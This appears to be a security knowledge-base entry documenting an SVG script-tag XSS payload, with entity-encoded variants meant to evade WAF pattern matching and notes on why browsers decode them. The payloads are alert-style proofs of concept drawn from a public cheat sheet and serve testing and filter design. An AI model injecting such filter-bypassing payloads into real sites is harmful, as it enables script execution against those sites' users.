---
title: SVG script Tag with HTML Entity Encoding
slug: svg-script-html-entity
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/innerHTML, sink/waf-bypass]
inbound: []
---

# SVG script Tag with HTML Entity Encoding

## Payload

```html
<svg><script>&#97;lert(1)</script></svg>
```

## Variants

```html
<svg><script>&#x61;lert(1)</script></svg>
<svg><script>alert&NewLine;(1)</script></svg>
<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
```

## Context

HTML entity encoding inside SVG's `<script>` element is decoded before JavaScript parsing — unlike HTML `<script>` elements (which treat content as raw text), SVG script content is processed through XML/HTML entity decoding. `&#97;` decodes to `a`; `&NewLine;` (a named entity for `\n`) is invisible to the JS parser and splits the token to bypass `alert(` pattern matching. The full compound-encoded variant encodes `alert` (the JS unicode escape for `alert`). The `x:script` XHTML namespace form works in XML MIME types (`application/xml`, `application/xhtml+xml`, `image/svg+xml`). Sink: `innerHTML` in SVG context.

## Provenance

- Distilled from: `../../techniques/dom-xss/waf-bypass.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [WAF Bypass and Obfuscation](../../techniques/dom-xss/waf-bypass.md)
